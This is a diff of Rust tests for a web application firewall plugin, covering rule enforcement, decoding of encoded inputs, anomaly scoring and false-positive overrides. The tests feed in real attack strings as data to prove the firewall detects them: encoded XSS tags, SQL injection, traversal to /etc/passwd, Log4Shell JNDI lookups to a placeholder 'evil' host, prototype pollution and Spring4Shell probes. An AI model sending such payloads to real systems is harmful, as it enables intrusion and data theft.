@@ -29,6 +29,22 @@ async fn default_waf_monitors_sqli_query_without_blocking() {
 }
 
 #[tokio::test]
+async fn clean_waf_evaluation_records_clean_action_for_metrics() {
+    let plugin = Waf::new(&json!({})).unwrap();
+    let mut ctx = ctx("GET", "/search");
+    ctx.set_raw_query_string("q=ordinary".into());
+
+    let result = plugin.authorize(&mut ctx).await;
+
+    assert!(matches!(result, PluginResult::Continue));
+    assert_eq!(
+        ctx.metadata.get("waf.action").map(String::as_str),
+        Some("clean")
+    );
+    assert!(!ctx.metadata.contains_key("waf.rule_hits"));
+}
+
+#[tokio::test]
 async fn rule_mode_can_enforce_default_rule() {
     let plugin = Waf::new(&json!({
         "rule_modes": { "FE-XSS-001": "enforce" }
@@ -91,7 +107,12 @@ async fn waf_clears_preexisting_reserved_metadata_before_evaluation() {
     let result = plugin.authorize(&mut ctx).await;
 
     assert!(matches!(result, PluginResult::Continue));
-    assert!(!ctx.metadata.keys().any(|key| key.starts_with("waf.")));
+    assert_eq!(
+        ctx.metadata.get("waf.action").map(String::as_str),
+        Some("clean")
+    );
+    assert!(!ctx.metadata.contains_key("waf.rule_hits"));
+    assert!(!ctx.metadata.contains_key("waf.severity"));
 }
 
 #[tokio::test]
@@ -219,6 +240,61 @@ async fn request_body_scan_uses_context_aware_final_body_hook() {
 }
 
 #[tokio::test]
+async fn highest_severity_is_preserved_across_scan_phases() {
+    let plugin = Waf::new(&json!({
+        "mode": "monitor",
+        "include_default_rules": false,
+        "custom_rules": [
+            {
+                "id": "CUSTOM-HIGH-QUERY",
+                "name": "high query marker",
+                "category": "custom",
+                "severity": "high",
+                "target": "query_values",
+                "match_kind": "contains",
+                "pattern": "high-marker",
+                "action": "monitor"
+            },
+            {
+                "id": "CUSTOM-LOW-BODY",
+                "name": "low body marker",
+                "category": "custom",
+                "severity": "low",
+                "target": "body_text",
+                "match_kind": "contains",
+                "pattern": "low-marker",
+                "action": "monitor"
+            }
+        ]
+    }))
+    .unwrap();
+    let mut ctx = ctx("POST", "/submit");
+    ctx.set_raw_query_string("q=high-marker".into());
+    ctx.headers
+        .insert("content-type".into(), "text/plain".into());
+
+    assert!(matches!(
+        plugin.authorize(&mut ctx).await,
+        PluginResult::Continue
+    ));
+    assert_eq!(
+        ctx.metadata.get("waf.severity").map(String::as_str),
+        Some("high")
+    );
+
+    let headers = ctx.headers.clone();
+    let result = plugin
+        .on_final_request_body_with_context(&mut ctx, &headers, b"low-marker")
+        .await;
+
+    assert!(matches!(result, PluginResult::Continue));
+    assert_eq!(
+        ctx.metadata.get("waf.severity").map(String::as_str),
+        Some("high")
+    );
+}
+
+#[tokio::test]
 async fn custom_body_json_path_rule_scans_only_selected_value() {
     let plugin = Waf::new(&json!({
         "include_default_rules": false,
@@ -251,6 +327,171 @@ async fn custom_body_json_path_rule_scans_only_selected_value() {
     assert_eq!(
         ctx.metadata.get("waf.rule_hits").map(String::as_str),
         Some("CUSTOM-JSON-1")
+    );
+}
+
+#[tokio::test]
+async fn body_json_path_rule_scans_decoded_variants() {
+    let plugin = Waf::new(&json!({
+        "include_default_rules": false,
+        "custom_rules": [{
+            "id": "CUSTOM-JSON-DECODED",
+            "name": "encoded script marker",
+            "category": "custom",
+            "severity": "high",
+            "target": { "type": "body_json_path", "path": "comment" },
+            "match_kind": "contains",
+            "pattern": "<script",
+            "action": "enforce"
+        }]
+    }))
+    .unwrap();
+    let mut ctx = ctx("POST", "/chat");
+    ctx.headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = ctx.headers.clone();
+
+    let result = plugin
+        .on_final_request_body_with_context(
+            &mut ctx,
+            &headers,
+            br#"{"comment":"&lt;script&gt;alert(1)&lt;/script&gt;"}"#,
+        )
+        .await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert_eq!(
+        ctx.metadata.get("waf.rule_hits").map(String::as_str),
+        Some("CUSTOM-JSON-DECODED")
+    );
+}
+
+#[tokio::test]
+async fn body_luhn_and_cidr_rules_scan_decoded_variants() {
+    let plugin = Waf::new(&json!({
+        "include_default_rules": false,
+        "custom_rules": [
+            {
+                "id": "CUSTOM-LUHN-BODY",
+                "name": "encoded payment card",
+                "category": "custom",
+                "severity": "high",
+                "target": "body_text",
+                "match_kind": "luhn",
+                "action": "enforce"
+            },
+            {
+                "id": "CUSTOM-CIDR-BODY",
+                "name": "encoded private address",
+                "category": "custom",
+                "severity": "high",
+                "target": "body_text",
+                "match_kind": "cidr",
+                "pattern": "10.0.0.0/8",
+                "action": "enforce"
+            }
+        ]
+    }))
+    .unwrap();
+    let mut luhn_ctx = ctx("POST", "/submit");
+    luhn_ctx
+        .headers
+        .insert("content-type".into(), "text/plain".into());
+    let headers = luhn_ctx.headers.clone();
+
+    let result = plugin
+        .on_final_request_body_with_context(
+            &mut luhn_ctx,
+            &headers,
+            b"card=4111 1111 1111 111&#49;",
+        )
+        .await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert!(
+        luhn_ctx
+            .metadata
+            .get("waf.rule_hits")
+            .is_some_and(|hits| hits.contains("CUSTOM-LUHN-BODY"))
+    );
+
+    let mut cidr_ctx = ctx("POST", "/submit");
+    cidr_ctx
+        .headers
+        .insert("content-type".into(), "text/plain".into());
+    let headers = cidr_ctx.headers.clone();
+
+    let result = plugin
+        .on_final_request_body_with_context(&mut cidr_ctx, &headers, b"ip=10&#46;1&#46;2&#46;3")
+        .await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert!(
+        cidr_ctx
+            .metadata
+            .get("waf.rule_hits")
+            .is_some_and(|hits| hits.contains("CUSTOM-CIDR-BODY"))
+    );
+}
+
+#[tokio::test]
+async fn decoded_body_rules_scan_lossy_utf8_bodies() {
+    let plugin = Waf::new(&json!({
+        "include_default_rules": false,
+        "custom_rules": [
+            {
+                "id": "CUSTOM-SCRIPT-LOSSY",
+                "name": "encoded script marker",
+                "category": "custom",
+                "severity": "high",
+                "target": "body_text",
+                "match_kind": "contains",
+                "pattern": "<script",
+                "action": "enforce"
+            },
+            {
+                "id": "CUSTOM-LUHN-LOSSY",
+                "name": "payment card in lossy text body",
+                "category": "custom",
+                "severity": "high",
+                "target": "body_text",
+                "match_kind": "luhn",
+                "action": "enforce"
+            }
+        ]
+    }))
+    .unwrap();
+
+    let mut encoded_ctx = ctx("POST", "/submit");
+    encoded_ctx
+        .headers
+        .insert("content-type".into(), "text/plain".into());
+    let headers = encoded_ctx.headers.clone();
+    let result = plugin
+        .on_final_request_body_with_context(&mut encoded_ctx, &headers, b"\xffq=%3Cscript%3E")
+        .await;
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert!(
+        encoded_ctx
+            .metadata
+            .get("waf.rule_hits")
+            .is_some_and(|hits| hits.contains("CUSTOM-SCRIPT-LOSSY"))
+    );
+
+    let mut luhn_ctx = ctx("POST", "/submit");
+    luhn_ctx
+        .headers
+        .insert("content-type".into(), "text/plain".into());
+    let headers = luhn_ctx.headers.clone();
+    let result = plugin
+        .on_final_request_body_with_context(&mut luhn_ctx, &headers, b"\xff4111111111111111")
+        .await;
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert!(
+        luhn_ctx
+            .metadata
+            .get("waf.rule_hits")
+            .is_some_and(|hits| hits.contains("CUSTOM-LUHN-LOSSY"))
     );
 }
 
@@ -410,6 +651,156 @@ async fn response_body_scan_detects_sensitive_data_when_enabled() {
         ctx.metadata
             .get("waf.rule_hits")
             .is_some_and(|hits| hits.contains("FE-DATA-LEAK-006"))
+    );
+}
+
+#[tokio::test]
+async fn response_luhn_and_cidr_rules_scan_decoded_variants() {
+    let plugin = Waf::new(&json!({
+        "include_default_rules": false,
+        "response_inspection": true,
+        "response_body_inspection": true,
+        "custom_rules": [
+            {
+                "id": "CUSTOM-LUHN-RESP",
+                "name": "encoded response payment card",
+                "category": "custom",
+                "severity": "high",
+                "target": "response_body",
+                "match_kind": "luhn",
+                "action": "enforce"
+            },
+            {
+                "id": "CUSTOM-CIDR-RESP-BODY",
+                "name": "encoded response private address",
+                "category": "custom",
+                "severity": "high",
+                "target": "response_body",
+                "match_kind": "cidr",
+                "pattern": "10.0.0.0/8",
+                "action": "enforce"
+            }
+        ]
+    }))
+    .unwrap();
+    let headers = HashMap::from([("content-type".to_string(), "text/plain".to_string())]);
+
+    let mut luhn_ctx = ctx("GET", "/debug");
+    let result = plugin
+        .on_final_response_body(
+            &mut luhn_ctx,
+            200,
+            &headers,
+            b"card=4111 1111 1111 111&#49;",
+        )
+        .await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert!(
+        luhn_ctx
+            .metadata
+            .get("waf.rule_hits")
+            .is_some_and(|hits| hits.contains("CUSTOM-LUHN-RESP"))
+    );
+
+    let mut cidr_ctx = ctx("GET", "/debug");
+    let result = plugin
+        .on_final_response_body(&mut cidr_ctx, 200, &headers, b"ip=10&#46;2&#46;3&#46;4")
+        .await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert!(
+        cidr_ctx
+            .metadata
+            .get("waf.rule_hits")
+            .is_some_and(|hits| hits.contains("CUSTOM-CIDR-RESP-BODY"))
+    );
+}
+
+#[tokio::test]
+async fn decoded_response_body_rules_scan_lossy_utf8_bodies() {
+    let plugin = Waf::new(&json!({
+        "include_default_rules": false,
+        "response_inspection": true,
+        "response_body_inspection": true,
+        "custom_rules": [{
+            "id": "CUSTOM-RESP-LOSSY",
+            "name": "encoded response marker",
+            "category": "custom",
+            "severity": "high",
+            "target": "response_body",
+            "match_kind": "contains",
+            "pattern": "<script",
+            "action": "enforce"
+        }]
+    }))
+    .unwrap();
+    let mut ctx = ctx("GET", "/debug");
+    let headers = HashMap::from([("content-type".to_string(), "text/plain".to_string())]);
+
+    let result = plugin
+        .on_final_response_body(&mut ctx, 200, &headers, b"\xffq=%3Cscript%3E")
+        .await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert!(
+        ctx.metadata
+            .get("waf.rule_hits")
+            .is_some_and(|hits| hits.contains("CUSTOM-RESP-LOSSY"))
+    );
+}
+
+#[tokio::test]
+async fn uppercase_html_entities_are_decoded_for_body_rules() {
+    let plugin = Waf::new(&json!({
+        "rule_modes": { "FE-XSS-001-B": "enforce" }
+    }))
+    .unwrap();
+    let mut ctx = ctx("POST", "/submit");
+    ctx.headers
+        .insert("content-type".into(), "text/html".into());
+    let headers = ctx.headers.clone();
+
+    let result = plugin
+        .on_final_request_body_with_context(
+            &mut ctx,
+            &headers,
+            b"&LT;script&GT;alert(1)&LT;/script&GT;",
+        )
+        .await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert!(
+        ctx.metadata
+            .get("waf.rule_hits")
+            .is_some_and(|hits| hits.contains("FE-XSS-001-B"))
+    );
+}
+
+#[tokio::test]
+async fn decoded_body_rules_scan_leading_zero_numeric_html_entities() {
+    let plugin = Waf::new(&json!({
+        "rule_modes": { "FE-XSS-001-B": "enforce" }
+    }))
+    .unwrap();
+    let mut ctx = ctx("POST", "/submit");
+    ctx.headers
+        .insert("content-type".into(), "text/html".into());
+    let headers = ctx.headers.clone();
+
+    let result = plugin
+        .on_final_request_body_with_context(
+            &mut ctx,
+            &headers,
+            b"&#000000060;script&#000000062;alert(1)&#000000060;/script&#000000062;",
+        )
+        .await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert!(
+        ctx.metadata
+            .get("waf.rule_hits")
+            .is_some_and(|hits| hits.contains("FE-XSS-001-B"))
     );
 }
 
@@ -877,4 +1268,711 @@ fn unknown_rule_modes_id_fails_construction() {
     .unwrap_err();
     assert!(err.contains("unknown rule id"));
     assert!(err.contains("FE-XSS-99"));
+}
+
+#[tokio::test]
+async fn body_normalization_catches_escaped_payload_the_raw_scan_misses() {
+    // A custom body rule matches `<script`. The payload arrives `\x`-escaped,
+    // so the raw byte scan never sees the tag — only the decode/normalization
+    // pass recovers it. Regression guard for the body-evasion gap.
+    let plugin = Waf::new(&json!({
+        "include_default_rules": false,
+        "custom_rules": [{
+            "id": "CUSTOM-XSS-BODY",
+            "name": "script tag in body",
+            "category": "custom",
+            "severity": "high",
+            "target": "body_text",
+            "match_kind": "contains",
+            "pattern": "<script",
+            "action": "enforce"
+        }]
+    }))
+    .unwrap();
+    let mut ctx = ctx("POST", "/submit");
+    ctx.headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = ctx.headers.clone();
+
+    // Sanity: the literal escaped form does not contain `<script`.
+    let escaped = br"{q:\x3cscript\x3ealert(1)}";
+    assert!(!escaped.windows(7).any(|w| w == b"<script"));
+
+    let result = plugin
+        .on_final_request_body_with_context(&mut ctx, &headers, escaped)
+        .await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert_eq!(
+        ctx.metadata.get("waf.rule_hits").map(String::as_str),
+        Some("CUSTOM-XSS-BODY")
+    );
+}
+
+#[tokio::test]
+async fn body_normalization_redecodes_unicode_escaped_html_entities() {
+    let plugin = Waf::new(&json!({
+        "rule_modes": { "FE-XSS-001-B": "enforce" }
+    }))
+    .unwrap();
+    let mut ctx = ctx("POST", "/submit");
+    ctx.headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = ctx.headers.clone();
+    let escaped = br#"{"comment":"\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;"}"#;
+    assert!(!escaped.windows(7).any(|w| w == b"<script"));
+    assert!(!escaped.windows(10).any(|w| w == b"&lt;script"));
+
+    let result = plugin
+        .on_final_request_body_with_context(&mut ctx, &headers, escaped)
+        .await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert!(monitored(&ctx, "FE-XSS-001-B"));
+}
+
+fn monitored(ctx: &RequestContext, rule_id: &str) -> bool {
+    ctx.metadata
+        .get("waf.rule_hits")
+        .is_some_and(|hits| hits.split(',').any(|hit| hit == rule_id))
+}
+
+#[tokio::test]
+async fn jndi_log4shell_detected_in_header_query_and_body() {
+    let plugin = Waf::new(&json!({})).unwrap();
+
+    // Header delivery — the original rule pack never scanned header values
+    // for injection payloads, the primary Log4Shell channel.
+    let mut header_ctx = ctx("GET", "/");
+    header_ctx
+        .headers
+        .insert("user-agent".into(), "${jndi:ldap://evil/x}".into());
+    let _ = plugin.authorize(&mut header_ctx).await;
+    assert!(monitored(&header_ctx, "FE-JNDI-001-H"));
+
+    // Query delivery.
+    let mut query_ctx = ctx("GET", "/search");
+    query_ctx.set_raw_query_string("x=${jndi:rmi://evil/x}".into());
+    let _ = plugin.authorize(&mut query_ctx).await;
+    assert!(monitored(&query_ctx, "FE-JNDI-001-Q"));
+
+    // Body delivery.
+    let mut body_ctx = ctx("POST", "/submit");
+    body_ctx
+        .headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = body_ctx.headers.clone();
+    let _ = plugin
+        .on_final_request_body_with_context(
+            &mut body_ctx,
+            &headers,
+            br#"{"a":"${jndi:dns://evil/x}"}"#,
+        )
+        .await;
+    assert!(monitored(&body_ctx, "FE-JNDI-001-B"));
+}
+
+#[tokio::test]
+async fn prototype_pollution_and_spring4shell_detected_in_body() {
+    let plugin = Waf::new(&json!({})).unwrap();
+
+    let mut proto_ctx = ctx("POST", "/submit");
+    proto_ctx
+        .headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = proto_ctx.headers.clone();
+    let _ = plugin
+        .on_final_request_body_with_context(
+            &mut proto_ctx,
+            &headers,
+            br#"{"__proto__":{"polluted":true}}"#,
+        )
+        .await;
+    assert!(monitored(&proto_ctx, "FE-PROTO-001"));
+
+    let mut spring_ctx = ctx("POST", "/submit");
+    spring_ctx.headers.insert(
+        "content-type".into(),
+        "application/x-www-form-urlencoded".into(),
+    );
+    let headers = spring_ctx.headers.clone();
+    let _ = plugin
+        .on_final_request_body_with_context(
+            &mut spring_ctx,
+            &headers,
+            b"class.module.classLoader.resources.context.parent.pipeline=x",
+        )
+        .await;
+    assert!(monitored(&spring_ctx, "FE-SPRING4SHELL-001-B"));
+}
+
+#[tokio::test]
+async fn xss_and_traversal_now_covered_in_request_body() {
+    let plugin = Waf::new(&json!({})).unwrap();
+
+    let mut xss_ctx = ctx("POST", "/submit");
+    xss_ctx
+        .headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = xss_ctx.headers.clone();
+    let _ = plugin
+        .on_final_request_body_with_context(
+            &mut xss_ctx,
+            &headers,
+            br#"{"comment":"<script>alert(1)</script>"}"#,
+        )
+        .await;
+    assert!(monitored(&xss_ctx, "FE-XSS-001-B"));
+
+    let mut trav_ctx = ctx("POST", "/submit");
+    trav_ctx
+        .headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = trav_ctx.headers.clone();
+    let _ = plugin
+        .on_final_request_body_with_context(
+            &mut trav_ctx,
+            &headers,
+            br#"{"file":"../../etc/passwd"}"#,
+        )
+        .await;
+    assert!(monitored(&trav_ctx, "FE-PATHTRAV-001-B"));
+    assert!(monitored(&trav_ctx, "FE-LFI-001-B"));
+}
+
+#[tokio::test]
+async fn ssti_arithmetic_probe_fires_but_plain_template_does_not_at_default_paranoia() {
+    let plugin = Waf::new(&json!({})).unwrap();
+
+    let mut probe_ctx = ctx("POST", "/submit");
+    probe_ctx
+        .headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = probe_ctx.headers.clone();
+    let _ = plugin
+        .on_final_request_body_with_context(&mut probe_ctx, &headers, br#"{"name":"{{7*7}}"}"#)
+        .await;
+    assert!(monitored(&probe_ctx, "FE-SSTI-002"));
+
+    // A plain template variable is not an attack. The broad `{{...}}` marker
+    // (FE-SSTI-001) is now gated behind paranoia_level >= 2, so nothing fires.
+    let mut plain_ctx = ctx("POST", "/submit");
+    plain_ctx
+        .headers
+        .insert("content-type".into(), "application/json".into());
+    let headers = plain_ctx.headers.clone();
+    let _ = plugin
+        .on_final_request_body_with_context(
+            &mut plain_ctx,
+            &headers,
+            br#"{"template":"Hello {{ username }}"}"#,
+        )
+        .await;
+    assert!(!plain_ctx.metadata.contains_key("waf.rule_hits"));
+}
+
+#[tokio::test]
+async fn retuned_loud_rules_are_silent_at_default_paranoia() {
+    let plugin = Waf::new(&json!({})).unwrap();
+
+    // Hex color `#fff` previously tripped the SQL-comment-token rule
+    // (FE-SQLI-004), now gated to paranoia_level >= 2.
+    let mut color_ctx = ctx("GET", "/search");
+    color_ctx.set_raw_query_string("color=#fff".into());
+    let _ = plugin.authorize(&mut color_ctx).await;
+    assert!(!monitored(&color_ctx, "FE-SQLI-004"));
+
+    // A bare URL in a query parameter previously tripped FE-RFI-001.
+    let mut url_ctx = ctx("GET", "/redirect");
+    url_ctx.set_raw_query_string("next=https://example.com/path".into());
+    let _ = plugin.authorize(&mut url_ctx).await;
+    assert!(!monitored(&url_ctx, "FE-RFI-001"));
+}
+
+#[tokio::test]
+async fn raised_paranoia_level_reactivates_retuned_rules() {
+    let plugin = Waf::new(&json!({ "paranoia_level": 2 })).unwrap();
+    let mut url_ctx = ctx("GET", "/redirect");
+    url_ctx.set_raw_query_string("next=https://example.com/path".into());
+    let _ = plugin.authorize(&mut url_ctx).await;
+    assert!(monitored(&url_ctx, "FE-RFI-001"));
+}
+
+#[tokio::test]
+async fn default_rule_action_enforce_blocks_built_in_rules() {
+    // The crux of gap 1.1: a single switch flips the built-in pack from
+    // monitor-only to enforcing, instead of one rule_modes entry per rule.
+    let plugin = Waf::new(&json!({
+        "mode": "enforce",
+        "default_rule_action": "enforce"
+    }))
+    .unwrap();
+    let mut ctx = ctx("GET", "/search");
+    ctx.set_raw_query_string("q=union+select+1".into());
+
+    let result = plugin.authorize(&mut ctx).await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert_eq!(
+        ctx.metadata
+            .get("waf.first_blocking_rule")
+            .map(String::as_str),
+        Some("FE-SQLI-001")
+    );
+}
+
+#[tokio::test]
+async fn default_rule_action_enforce_monitors_when_global_mode_is_monitor() {
+    let plugin = Waf::new(&json!({
+        "mode": "monitor",
+        "default_rule_action": "enforce"
+    }))
+    .unwrap();
+    let mut ctx = ctx("GET", "/search");
+    ctx.set_raw_query_string("q=union+select+1".into());
+
+    let result = plugin.authorize(&mut ctx).await;
+
+    assert!(matches!(result, PluginResult::Continue));
+    assert_eq!(
+        ctx.metadata.get("waf.action").map(String::as_str),
+        Some("monitored")
+    );
+    assert!(!ctx.metadata.contains_key("waf.first_blocking_rule"));
+}
+
+#[tokio::test]
+async fn rule_modes_still_overrides_default_rule_action() {
+    let plugin = Waf::new(&json!({
+        "mode": "enforce",
+        "default_rule_action": "enforce",
+        "rule_modes": { "FE-SQLI-001": "monitor" }
+    }))
+    .unwrap();
+    let mut ctx = ctx("GET", "/search");
+    ctx.set_raw_query_string("q=union+select+1".into());
+
+    let result = plugin.authorize(&mut ctx).await;
+
+    assert!(matches!(result, PluginResult::Continue));
+    assert_eq!(
+        ctx.metadata.get("waf.action").map(String::as_str),
+        Some("monitored")
+    );
+}
+
+#[tokio::test]
+async fn rule_override_attaches_fp_filter_to_built_in_rule() {
+    // Gap 1.6: tune a noisy built-in without forking the rule pack.
+    let plugin = Waf::new(&json!({
+        "mode": "enforce",
+        "default_rule_action": "enforce",
+        "rule_overrides": { "FE-SQLI-001": { "fp_filters": ["union select version_id"] } }
+    }))
+    .unwrap();
+
+    let mut suppressed = ctx("GET", "/report");
+    suppressed.set_raw_query_string("q=union+select+version_id".into());
+    assert!(matches!(
+        plugin.authorize(&mut suppressed).await,
+        PluginResult::Continue
+    ));
+
+    let mut blocked = ctx("GET", "/report");
+    blocked.set_raw_query_string("q=union+select+password".into());
+    assert!(matches!(
+        plugin.authorize(&mut blocked).await,
+        PluginResult::Reject { .. }
+    ));
+}
+
+#[tokio::test]
+async fn rule_override_fp_filter_suppresses_special_encoding_rule() {
+    let plugin = Waf::new(&json!({
+        "mode": "enforce",
+        "default_rule_action": "enforce",
+        "rule_overrides": {
+            "FE-ENCODING-001": { "fp_filters": ["known%252fpath"] }
+        }
+    }))
+    .unwrap();
+
+    let mut suppressed = ctx("GET", "/known%252fpath");
+    assert!(matches!(
+        plugin.authorize(&mut suppressed).await,
+        PluginResult::Continue
+    ));
+    assert!(!suppressed.metadata.contains_key("waf.rule_hits"));
+
+    let mut blocked = ctx("GET", "/blocked%252fpath");
+    assert!(matches!(
+        plugin.authorize(&mut blocked).await,
+        PluginResult::Reject { .. }
+    ));
+    assert_eq!(
+        blocked
+            .metadata
+            .get("waf.first_blocking_rule")
+            .map(String::as_str),
+        Some("FE-ENCODING-001")
+    );
+}
+
+#[tokio::test]
+async fn rule_override_fp_filter_suppresses_special_hpp_rule() {
+    let plugin = Waf::new(&json!({
+        "mode": "enforce",
+        "default_rule_action": "enforce",
+        "rule_overrides": {
+            "FE-HPP-001": { "fp_filters": ["role=user&role=admin"] }
+        }
+    }))
+    .unwrap();
+
+    let mut suppressed = ctx("GET", "/search");
+    suppressed.set_raw_query_string("role=user&role=admin".into());
+    assert!(matches!(
+        plugin.authorize(&mut suppressed).await,
+        PluginResult::Continue
+    ));
+    assert!(!suppressed.metadata.contains_key("waf.rule_hits"));
+
+    let mut blocked = ctx("GET", "/search");
+    blocked.set_raw_query_string("role=user&role=root".into());
+    assert!(matches!(
+        plugin.authorize(&mut blocked).await,
+        PluginResult::Reject { .. }
+    ));
+    assert_eq!(
+        blocked
+            .metadata
+            .get("waf.first_blocking_rule")
+            .map(String::as_str),
+        Some("FE-HPP-001")
+    );
+}
+
+#[tokio::test]
+async fn rule_override_scopes_built_in_rule_to_paths() {
+    let plugin = Waf::new(&json!({
+        "mode": "enforce",
+        "default_rule_action": "enforce",
+        "rule_overrides": { "FE-SQLI-001": { "conditions": { "paths": ["/api*"] } } }
+    }))
+    .unwrap();
+
+    let mut outside = ctx("GET", "/public");
+    outside.set_raw_query_string("q=union+select+1".into());
+    assert!(matches!(
+        plugin.authorize(&mut outside).await,
+        PluginResult::Continue
+    ));
+
+    let mut inside = ctx("GET", "/api/users");
+    inside.set_raw_query_string("q=union+select+1".into());
+    assert!(matches!(
+        plugin.authorize(&mut inside).await,
+        PluginResult::Reject { .. }
+    ));
+}
+
+#[tokio::test]
+async fn rule_override_can_lower_paranoia_to_reactivate_rule() {
+    let plugin = Waf::new(&json!({
+        "rule_overrides": { "FE-RFI-001": { "paranoia_min": 1 } }
+    }))
+    .unwrap();
+    let mut ctx = ctx("GET", "/redirect");
+    ctx.set_raw_query_string("next=https://example.com/x".into());
+    let _ = plugin.authorize(&mut ctx).await;
+    assert!(monitored(&ctx, "FE-RFI-001"));
+}
+
+#[tokio::test]
+async fn rule_override_action_enforces_rule() {
+    let plugin = Waf::new(&json!({
+        "mode": "enforce",
+        "rule_overrides": { "FE-SQLI-001": { "action": "enforce" } }
+    }))
+    .unwrap();
+    let mut ctx = ctx("GET", "/search");
+    ctx.set_raw_query_string("q=union+select+1".into());
+
+    let result = plugin.authorize(&mut ctx).await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert_eq!(
+        ctx.metadata
+            .get("waf.first_blocking_rule")
+            .map(String::as_str),
+        Some("FE-SQLI-001")
+    );
+}
+
+#[tokio::test]
+async fn rule_override_action_enforce_monitors_when_global_mode_is_monitor() {
+    let plugin = Waf::new(&json!({
+        "mode": "monitor",
+        "rule_overrides": { "FE-SQLI-001": { "action": "enforce" } }
+    }))
+    .unwrap();
+    let mut ctx = ctx("GET", "/search");
+    ctx.set_raw_query_string("q=union+select+1".into());
+
+    let result = plugin.authorize(&mut ctx).await;
+
+    assert!(matches!(result, PluginResult::Continue));
+    assert_eq!(
+        ctx.metadata.get("waf.action").map(String::as_str),
+        Some("monitored")
+    );
+    assert!(!ctx.metadata.contains_key("waf.first_blocking_rule"));
+}
+
+#[test]
+fn unknown_rule_override_id_fails_construction() {
+    let err = Waf::new(&json!({
+        "rule_overrides": { "FE-NOPE-999": { "paranoia_min": 2 } }
+    }))
+    .unwrap_err();
+    assert!(err.contains("rule_overrides"));
+    assert!(err.contains("FE-NOPE-999"));
+}
+
+#[test]
+fn unknown_rule_override_field_fails_construction() {
+    let err = Waf::new(&json!({
+        "rule_overrides": { "FE-SQLI-001": { "severty": "critical" } }
+    }))
+    .unwrap_err();
+    assert!(err.contains("unsupported field"));
+    assert!(err.contains("severty"));
+}
+
+#[tokio::test]
+async fn scoring_blocks_on_aggregate_without_any_enforce_rule() {
+    // Two monitor-only High hits (5 + 5) cross the threshold of 8. Nothing is
+    // set to enforce — the block comes purely from the aggregate score.
+    let plugin = Waf::new(&json!({
+        "mode": "enforce",
+        "scoring": { "enabled": true, "block_threshold": 8 }
+    }))
+    .unwrap();
+    let mut ctx = ctx("GET", "/search");
+    ctx.set_raw_query_string("q=<script>union+select+1".into());
+
+    let result = plugin.authorize(&mut ctx).await;
+
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert_eq!(
+        ctx.metadata.get("waf.action").map(String::as_str),
+        Some("blocked")
+    );
+    assert_eq!(
+        ctx.metadata.get("waf.block_reason").map(String::as_str),
+        Some("score")
+    );
+    assert_eq!(
+        ctx.metadata.get("waf.score").map(String::as_str),
+        Some("10")
+    );
+}
+
+#[tokio::test]
+async fn scoring_records_but_does_not_block_in_monitor_mode() {
+    let plugin = Waf::new(&json!({
+        "mode": "monitor",
+        "scoring": { "enabled": true, "block_threshold": 1 }
+    }))
+    .unwrap();
+    let mut ctx = ctx("GET", "/search");
+    ctx.set_raw_query_string("q=union+select+1".into());
+
+    let result = plugin.authorize(&mut ctx).await;
+
+    assert!(matches!(result, PluginResult::Continue));
+    assert_eq!(ctx.metadata.get("waf.score").map(String::as_str), Some("5"));
+    assert_eq!(
+        ctx.metadata.get("waf.action").map(String::as_str),
+        Some("monitored")
+    );
+}
+
+#[tokio::test]
+async fn scoring_accumulates_across_query_and_body_phases() {
+    let plugin = Waf::new(&json!({
+        "mode": "enforce",
+        "scoring": { "enabled": true, "block_threshold": 8 }
+    }))
+    .unwrap();
+    let mut ctx = ctx("POST", "/submit");
+    ctx.headers
+        .insert("content-type".into(), "application/json".into());
+    ctx.set_raw_query_string("q=union+select+1".into());
+
+    // Query phase scores one High (5) — below the threshold, so it passes.
+    let result = plugin.authorize(&mut ctx).await;
+    assert!(matches!(result, PluginResult::Continue));
+    assert_eq!(ctx.metadata.get("waf.score").map(String::as_str), Some("5"));
+
+    // Body phase adds another High (5) → cumulative 10 → blocked.
+    let headers = ctx.headers.clone();
+    let result = plugin
+        .on_final_request_body_with_context(
+            &mut ctx,
+            &headers,
+            br#"{"c":"<script>alert(1)</script>"}"#,
+        )
+        .await;
+    assert!(matches!(result, PluginResult::Reject { .. }));
+    assert_eq!(
+        ctx.metadata.get("waf.score").map(String::as_str),
+        Some("10")
+    );
+    assert_eq!(
+        ctx.metadata.get("waf.block_reason").map(String::as_str),
+        Some("score")
+    );
+}
+
+#[tokio::test]
+async fn scoring_ignores_preexisting_public_score_metadata() {
+    let plugin = Waf::new(&json!({
+        "mode": "enforce",
+        "scoring": { "enabled": true, "block_threshold": 8 }
+    }))
+    .unwrap();
+    let mut ctx = ctx("GET", "/search");
+    ctx.metadata
+        .insert("waf.score".to_string(), "1000".to_string());
+    ctx.set_raw_query_string("q=union+select+1".into());
+
+    let result = plugin.authorize(&mut ctx).await;
+
+    assert!(matches!(result, PluginResult::Continue));
+    assert_eq!(ctx.metadata.get("waf.score").map(String::as_str), Some("5"));
+}
+
+#[tokio::test]
+async fn scoring_with_metadata_disabled_uses_private_state() {
+    let plugin = Waf::new(&json!({
+        "mode": "enforce",
+        "log_to_metadata": false,
+        "scoring": { "enabled": true, "block_threshold": 8 }
+    }))
+    .unwrap();
+    let mut ctx = ctx("POST", "/submit");
+    ctx.headers
+        .insert("content-type".into(), "application/json".into());
